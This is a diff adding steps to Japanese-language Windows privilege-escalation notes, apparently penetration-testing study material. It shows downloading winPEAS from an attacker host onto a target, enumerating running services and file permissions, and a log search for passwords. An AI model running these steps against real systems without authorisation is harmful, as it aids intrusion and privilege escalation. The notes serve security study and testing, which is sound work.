@@ -116,3 +116,36 @@ Get-History
 ```
 Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -match "pass" }
 ```
+
+20. ターゲット上で、attacker端末からwinPEASをダウンロードして落としてくる
+```
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+```
+
+21. ターゲットのWindows上で動いているサービスのバイナリの名前、状態、パスを取得する。  
+winRMやbindshellで行うと失敗するので、RDP等の対話型ログオンをする必要がある。
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+22. icaclsでバイナリに対応するアクセス権限とプリンシパルを表示する
+```
+icacls "C:\xampp\apache\bin\httpd.exe"
+```
+icaclsの権限は以下の通り  
+MASK	PERMISSIONS  
+F	Full access  
+M	Modify access  
+RX	Read and execute access  
+R	Read-only access  
+W	Write-only access  
+
+23. mysqlサービスのスタートアップの種類を確認する
+```
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+```
+
+24. 自分の権限をすべて確認する
+```
+whoami /priv
+```
